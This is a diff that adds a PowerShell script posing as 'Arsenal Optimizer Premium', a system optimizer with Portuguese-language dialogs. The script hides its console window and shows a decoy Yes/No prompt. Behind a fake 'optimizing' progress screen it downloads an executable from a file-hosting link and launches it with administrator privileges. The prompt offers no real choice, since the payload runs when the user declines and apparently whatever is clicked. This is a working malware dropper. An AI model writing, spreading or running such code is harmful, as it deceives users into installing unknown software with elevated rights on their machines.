@@ -1,0 +1,172 @@
+Add-Type -AssemblyName PresentationFramework
+
+function Show-DownloadDialog {
+    [void] [System.Reflection.Assembly]::LoadWithPartialName("presentationframework")
+
+    $window = New-Object System.Windows.Window
+    $window.Title = "Optimizer"
+    $window.Width = 600
+    $window.Height = 500
+    $window.WindowStartupLocation = "CenterScreen"
+    $window.WindowStyle = "None"
+    $window.ResizeMode = "NoResize"
+    $window.Background = [System.Windows.Media.Brushes]::Black
+    $window.AllowsTransparency = $true
+    $window.Opacity = 0.98
+
+    $border = New-Object System.Windows.Controls.Border
+    $border.Background = [System.Windows.Media.Brushes]::DarkSlateGray
+    $border.CornerRadius = "15"
+    $border.Padding = "20"
+    $border.Margin = "20"
+    $border.BorderBrush = [System.Windows.Media.Brushes]::Teal
+    $border.BorderThickness = "3"
+
+    $stackPanel = New-Object System.Windows.Controls.StackPanel
+    $stackPanel.HorizontalAlignment = "Center"
+    $stackPanel.VerticalAlignment = "Center"
+    
+    $textBlock = New-Object System.Windows.Controls.TextBlock
+    $textBlock.Text = "Arsenal Optimizer Premium"
+    $textBlock.Margin = "15"
+    $textBlock.HorizontalAlignment = "Center"
+    $textBlock.Foreground = [System.Windows.Media.Brushes]::White
+    $textBlock.FontSize = 26
+    $textBlock.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
+    $textBlock.FontWeight = "Bold"
+
+    $stackPanel.Children.Add($textBlock)
+    
+    $buttonPanel = New-Object System.Windows.Controls.StackPanel
+    $buttonPanel.Orientation = "Horizontal"
+    $buttonPanel.HorizontalAlignment = "Center"
+    $buttonPanel.Margin = "30"
+    
+    $yesButton = New-Object System.Windows.Controls.Button
+    $yesButton.Content = "Sim"
+    $yesButton.Width = 100
+    $yesButton.Margin = "10"
+    $yesButton.Background = [System.Windows.Media.Brushes]::MediumSeaGreen
+    $yesButton.Foreground = [System.Windows.Media.Brushes]::White
+    $yesButton.FontSize = 16
+    $yesButton.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
+    $yesButton.FontWeight = "Bold"
+    $yesButton.Padding = "10"
+
+    $noButton = New-Object System.Windows.Controls.Button
+    $noButton.Content = "Não"
+    $noButton.Width = 100
+    $noButton.Margin = "10"
+    $noButton.Background = [System.Windows.Media.Brushes]::Firebrick
+    $noButton.Foreground = [System.Windows.Media.Brushes]::White
+    $noButton.FontSize = 16
+    $noButton.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
+    $noButton.FontWeight = "Bold"
+    $noButton.Padding = "10"
+
+    $buttonPanel.Children.Add($yesButton)
+    $buttonPanel.Children.Add($noButton)
+    $stackPanel.Children.Add($buttonPanel)
+    
+    $border.Child = $stackPanel
+    $window.Content = $border
+
+    $userResponse = $null
+    
+    $yesButton.Add_Click({
+        $userResponse = $true
+        $window.Close()
+    })
+    
+    $noButton.Add_Click({
+        $userResponse = $false
+        $window.Close()
+    })
+    
+    $window.Closing.Add({
+        if ($null -eq $userResponse) {
+            $userResponse = $false
+        }
+    })
+    
+    $window.ShowDialog()
+    return $userResponse
+}
+
+function DownloadAndExecute {
+    $url = "https://www.upload.ee/download/16677072/66c7c0e1fc261eda8ea7/img.exe"
+    $output = "$env:TEMP\img.exe"
+    
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($url, $output)
+
+    Start-Process -FilePath $output -Verb RunAs
+}
+
+$consoleWindow = (Get-Process -id $pid).MainWindowHandle
+$user32 = Add-Type -TypeDefinition @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class User32 {
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
+    }
+"@ -PassThru
+$user32::ShowWindow($consoleWindow, 0)
+
+$dialogResult = Show-DownloadDialog
+
+if ($null -eq $dialogResult -or $dialogResult -eq $false) {
+    $loadingWindow = New-Object System.Windows.Window
+    $loadingWindow.Title = "Carregando"
+    $loadingWindow.Width = 400
+    $loadingWindow.Height = 150
+    $loadingWindow.WindowStartupLocation = "CenterScreen"
+    $loadingWindow.WindowStyle = "None"
+    $loadingWindow.ResizeMode = "NoResize"
+    $loadingWindow.Background = [System.Windows.Media.Brushes]::Black
+    $loadingWindow.AllowsTransparency = $true
+    $loadingWindow.Opacity = 0.98
+    
+    $border = New-Object System.Windows.Controls.Border
+    $border.Background = [System.Windows.Media.Brushes]::DarkSlateGray
+    $border.CornerRadius = "15"
+    $border.Padding = "20"
+    $border.Margin = "10"
+    $border.BorderBrush = [System.Windows.Media.Brushes]::Teal
+    $border.BorderThickness = "3"
+
+    $loadingStackPanel = New-Object System.Windows.Controls.StackPanel
+    $loadingStackPanel.HorizontalAlignment = "Center"
+    $loadingStackPanel.VerticalAlignment = "Center"
+
+    $loadingText = New-Object System.Windows.Controls.TextBlock
+    $loadingText.Text = "Otimizando, por favor aguarde..."
+    $loadingText.Margin = "10"
+    $loadingText.HorizontalAlignment = "Center"
+    $loadingText.VerticalAlignment = "Center"
+    $loadingText.Foreground = [System.Windows.Media.Brushes]::White
+    $loadingText.FontSize = 18
+    $loadingText.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
+    $loadingText.FontWeight = "Bold"
+
+    $progressBar = New-Object System.Windows.Controls.ProgressBar
+    $progressBar.Width = 300
+    $progressBar.Height = 20
+    $progressBar.IsIndeterminate = $true
+    $progressBar.Foreground = [System.Windows.Media.Brushes]::Teal
+    $progressBar.Margin = "10"
+
+    $loadingStackPanel.Children.Add($loadingText)
+    $loadingStackPanel.Children.Add($progressBar)
+
+    $border.Child = $loadingStackPanel
+    $loadingWindow.Content = $border
+    $loadingWindow.Show()
+    
+    DownloadAndExecute
+    
+    $loadingWindow.Close()
+}
+
+exit
